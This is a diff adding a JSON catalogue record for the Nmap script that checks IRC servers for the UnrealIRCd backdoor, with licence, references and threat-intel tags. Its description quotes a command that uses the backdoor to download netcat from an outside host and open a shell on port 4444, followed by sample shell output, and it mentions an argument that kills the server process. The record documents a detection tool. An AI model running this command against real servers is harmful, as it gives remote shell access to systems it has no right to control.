@@ -1,0 +1,28 @@
+{
+  "uuid": "4a4fb64c-3ba2-4035-adcb-5d0d376060a1",
+  "title": "irc-unrealircd-backdoor",
+  "format": "nse",
+  "author": "Unknown",
+  "license": "Same as Nmap--See https://nmap.org/book/man-legal.html",
+  "license_verified": false,
+  "description": "Checks if an IRC server is backdoored by running a time-based command (ping)\nand checking how long it takes to respond.\n\nThe <code>irc-unrealircd-backdoor.command</code> script argument can be used to\nrun an arbitrary command on the remote system. Because of the nature of\nthis vulnerability (the output is never returned) we have no way of\ngetting the output of the command. It can, however, be used to start a\nnetcat listener as demonstrated here:\n<code>\n  $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>\n  $ ncat -vv localhost 4444\n  Ncat: Version 5.30BETA1 ( https://nmap.org/ncat )\n  Ncat: Connected to 127.0.0.1:4444.\n  pwd\n  /home/ron/downloads/Unreal3.2-bad\n  whoami\n  ron\n</code>\n\nMetasploit can also be used to exploit this vulnerability.\n\nIn addition to running arbitrary commands, the\n<code>irc-unrealircd-backdoor.kill</code> script argument can be passed, which\nsimply kills the UnrealIRCd process.\n\n\nReference:\n* http://seclists.org/fulldisclosure/2010/Jun/277\n* http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt\n* http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor",
+  "source": "https://github.com/nmap/nmap",
+  "tags": [
+    "PAP:CLEAR",
+    "tlp:clear",
+    "ms-caro-malware-full:malware-platform=\"Win32\"",
+    "ms-caro-malware-full:malware-platform=\"Linux\"",
+    "ms-caro-malware-full:malware-platform=\"Unix\"",
+    "ms-caro-malware-full:malware-type=\"Backdoor\"",
+    "misp-galaxy:tool=\"Netcat\"",
+    "misp-galaxy:tool=\"metasploit\"",
+    "misp-galaxy:operating-system=\"Windows\"",
+    "misp-galaxy:operating-system=\"Linux\"",
+    "misp-galaxy:operating-system=\"UNIX\""
+  ],
+  "attack_techniques": [],
+  "cve": [],
+  "created_at": "2026-04-07",
+  "last_modified": "2026-04-07",
+  "rulezet_url": "https://rulezet.org/rule/detail_rule/223369"
+}
